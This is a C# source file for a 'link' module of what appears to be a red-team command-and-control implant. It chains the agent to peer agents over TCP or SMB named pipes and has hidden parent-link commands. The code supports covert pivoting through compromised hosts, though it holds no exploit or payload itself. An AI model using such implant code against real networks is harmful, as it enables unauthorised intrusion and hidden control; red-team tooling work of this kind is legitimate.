using System.Collections.Generic;
using System.Text;

class LinkModule : IAgentModule
{
    AgentController Agent;
    ConfigController Config;

    public void Init(AgentController agent, ConfigController config)
    {
        Agent = agent;
        Config = config;
    }

    public AgentModuleInfo GetModuleInfo()
    {
        return new AgentModuleInfo
        {
            Name = "link",
            Description = "Link to P2P Agents",
            Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
            Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "tcp",
                        Description = "Link to a TCP Agent",
                        HelpText = "link tcp [address] [port]",
                        CallBack = LinkTcpAgent
                    },
                    new AgentCommand
                    {
                        Name = "smb",
                        Description = "Link to an SMB Agent",
                        HelpText = "link smb [address] [pipename]",
                        CallBack = LinkSmbAgent
                    },
                    new AgentCommand
                    {
                        Name = "IncomingLink",
                        Visible = false,
                        CallBack = IncomingLink
                    },
                    new AgentCommand
                    {
                        Name = "IncomingUnlink",
                        Visible = false,
                        CallBack = IncomingUnlink
                    }
                }
        };
    }



    private void LinkTcpAgent(byte[] data)
    {
        var args = Encoding.UTF8.GetString(data).Split(' ');
        var hostname = args[0];
        var port = int.Parse(args[1]);

        var module = new TcpCommModule(hostname, port);
        Agent.AddP2PAgent(hostname, module);
    }

    private void LinkSmbAgent(byte[] data)
    {
        var args = Encoding.UTF8.GetString(data).Split(' ');
        var hostname = args[0];
        var pipename = args[1];

        var module = new SmbCommModule(hostname, pipename);
        Agent.AddP2PAgent(hostname, module);
    }

    private void IncomingLink(byte[] data)
    {
        var parentID = Encoding.UTF8.GetString(data);
        Agent.SetParentAgent(parentID);
    }

    private void IncomingUnlink(byte[] data)
    {
        Agent.SetParentAgent(string.Empty);
    }
}